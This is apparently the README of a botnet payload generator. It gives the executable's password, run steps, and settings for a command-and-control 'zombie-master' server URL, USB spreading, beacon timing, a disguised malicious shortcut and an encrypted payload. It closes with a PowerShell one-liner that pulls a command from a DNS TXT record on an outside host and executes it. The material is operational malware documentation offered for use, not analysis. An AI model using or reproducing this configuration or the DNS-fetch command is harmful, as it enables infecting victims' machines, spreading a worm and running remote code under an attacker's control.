   Readme
------------
Password of the generator.exe is: lool

01- set parameter in config.ini (see exemple below)
02- run generator.exe
03- wait 02 minutes after the execution even if the command prompt disappear,
    the generator still working in the background.
04- open output and enjoy various payloads



howto set parameters:
----------------------
[c2c] : Zombie-master server URL the or Control Center

[usbspreading] : Want to spread the zombie via USB ? 
default is "OFF"

[sleeptime1] : First random time before a zombie contact the zombie-master server 

[sleeptime2] : Second random time before a zombie contact the zombie-master server

[sleeptime3] : Third random time before a zombie contact the zombie-master server

[lnkicon] : Icon for the malicious link generated
exemple: lnkicon=%SystemRoot%\system32\SHELL32.dll, 8

[lnkname] : Name of the malicious link that can execute the payload

[passcrypt] : password for the encrypted payload

[salt] : Salt to use during the encryption process of the payload





---perspectives -----------
powershell -c "powershell . (nslookup.exe -q=txt c2curl.com)[5]" @MDSecLabs 
